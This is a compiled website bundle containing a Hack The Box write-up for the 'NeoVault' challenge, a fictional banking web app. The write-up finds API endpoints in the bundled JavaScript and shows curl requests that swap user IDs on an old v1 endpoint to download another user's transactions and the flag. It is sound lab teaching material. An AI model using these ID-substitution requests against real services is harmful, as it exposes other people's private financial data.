"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[7991],{5054:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>o,metadata:()=>a,toc:()=>l});const a=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/Challenges/NeoVault","title":"NeoVault","description":"https://app.hackthebox.com/challenges/NeoVault","source":"@site/docs/Hacking/Write-ups/Hack the box/Challenges/NeoVault.md","sourceDirName":"Hacking/Write-ups/Hack the box/Challenges","slug":"/write-up/htb/challenges/neo-vault","permalink":"/docs/write-up/htb/challenges/neo-vault","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/challenges/neo-vault","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var s=t(4848),i=t(8453);const o={slug:"/write-up/htb/challenges/neo-vault",pagination_next:null,pagination_prev:null},r="NeoVault",c={},l=[];function d(e){const n={a:"a",code:"code",h1:"h1",header:"header",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"neovault",children:"NeoVault"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://app.hackthebox.com/challenges/NeoVault",children:"https://app.hackthebox.com/challenges/NeoVault"})}),"\n",(0,s.jsx)(n.p,{children:"Neovault is a trusted banking app for fund transfers and downloading transaction history. You're invited to explore the app, find potential vulnerabilities, and uncover the hidden flag within."}),"\n",(0,s.jsx)(n.p,{children:"We are given access to an instance IP and port."}),"\n",(0,s.jsxs)(n.p,{children:["The JS code is bundled with webpack. Let's analyze the app with ",(0,s.jsx)(n.code,{children:"whatweb"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ whatweb 94.237.54.192:34875\nhttp://94.237.54.192:34875 [200 OK] Country[FINLAND][FI], HTML5, HTTPServer[nginx/1.22.1], IP[94.237.54.192], PasswordField[password], Script, Title[NeoVault], UncommonHeaders[x-nextjs-cache,x-nextjs-prerender,x-nextjs-stale-time], X-Powered-By[Next.js], nginx[1.22.1]\n"})}),"\n",(0,s.jsx)(n.p,{children:"A webapp built with nextjs, bundled with webpack. No sourcemaps available"}),"\n",(0,s.jsx)(n.p,{children:"This doesn't reveal much. The application does not show much option to interact with, there's only login and create an account. Let's do it!"}),"\n",(0,s.jsxs)(n.p,{children:['Checking the source code, looks like it\'s bundled with webpack, we can use prettier to "deofuscate" it: ',(0,s.jsx)(n.a,{href:"https://prettier.io/playground",children:"https://prettier.io/playground"})]}),"\n",(0,s.jsx)(n.p,{children:"Checking the code we can find the backend endppoints:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'      let a = {\n        endpointsV1: {\n          me: "/api/v1/auth/me",\n          login: "/api/v1/auth/login",\n          register: "/api/v1/auth/register",\n          logout: "/api/v1/auth/logout",\n          changeEmail: "/api/v1/auth/change-email",\n          transactions: "/api/v1/transactions",\n          deposit: "/api/v1/transactions/deposit",\n          balanceHistory: "/api/v1/transactions/balance-history",\n          categoryPercentages: "/api/v1/transactions/categories-spending",\n          downloadTransactions: "/api/v1/transactions/download-transactions",\n        },\n        endpointsV2: {\n          me: "/api/v2/auth/me",\n          login: "/api/v2/auth/login",\n          register: "/api/v2/auth/register",\n          logout: "/api/v2/auth/logout",\n          changeEmail: "/api/v2/auth/change-email",\n          transactions: "/api/v2/transactions",\n          deposit: "/api/v2/transactions/deposit",\n          balanceHistory: "/api/v2/transactions/balance-history",\n          categoryPercentages: "/api/v2/transactions/categories-spending",\n          downloadTransactions: "/api/v2/transactions/download-transactions",\n          inquireUser: "/api/v2/auth/inquire",\n        },\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Potentially the last endpoint allows us to enumerate the users. If we pay attention to the visible deposit, we can see it's coming from ",(0,s.jsx)(n.code,{children:"neo_system"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"If we call the inquie endpoint, we can see its id:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",children:'{"_id":"688cf823d181feda936b9d54","username":"neo_system"}\n'})}),"\n",(0,s.jsx)(n.p,{children:"In the PDF download button, if we change from v2 to v1, we get the following message:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",children:'{"message":"_id is not provided"}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["which ressembles to MongoDB database error: ",(0,s.jsx)(n.a,{href:"https://stackoverflow.com/questions/24427845/can-not-find-a-record-by-its-id-in-mongodb",children:"https://stackoverflow.com/questions/24427845/can-not-find-a-record-by-its-id-in-mongodb"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\\n  -H 'Accept: */*' \\\n  -H 'Accept-Language: en-US,en;q=0.9' \\\n  -H 'Content-Type: application/json' \\\n  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\\n  -H 'Origin: http://94.237.61.242:59723' \\\n  -H 'Proxy-Connection: keep-alive' \\\n  -H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\\n  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\\n  --data-raw '{\"_id\":\"688cf823d181feda936b9d54\",\"username\":\"neo_system\"}' \\\n  --insecure\n"})}),"\n",(0,s.jsxs)(n.p,{children:["And it works, we can see it made a deposit to a user named ",(0,s.jsx)(n.code,{children:"user_with_flag"}),". Let's enquire the user:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-json",children:'{"_id":"688cf823d181feda936b9d59","username":"user_with_flag"}\n'})}),"\n",(0,s.jsx)(n.p,{children:"and retrieve the transactions again for this user:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"curl 'http://94.237.61.242:59723/api/v1/transactions/download-transactions' \\\n-H 'Accept: */*' \\\n-H 'Accept-Language: en-US,en;q=0.9' \\\n-H 'Content-Type: application/json' \\\n-b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY4OGNmOTI4ZDE4MWZlZGE5MzZiOWQ2MyIsImlhdCI6MTc1NDA3MDA2NywiZXhwIjoxNzU0MDczNjY3fQ.BfcX5Fsdizd99JwxO6sY5shQNLrdxq6iIpYkqP_cX-8' \\\n-H 'Origin: http://94.237.61.242:59723' \\\n-H 'Proxy-Connection: keep-alive' \\\n-H 'Referer: http://94.237.61.242:59723/dashboard/transactions' \\\n-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' \\\n--data-raw '{\"_id\":\"688cf823d181feda936b9d59\",\"username\":\"user_with_flag\"}' \\\n--insecure\n"})}),"\n",(0,s.jsx)(n.p,{children:"And we can see the secret into the PDF"})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},8453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>r});var a=t(6540);const s={},i=a.createContext(s);function o(e){const n=a.useContext(i);return a.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),a.createElement(i.Provider,{value:n},e.children)}}}]);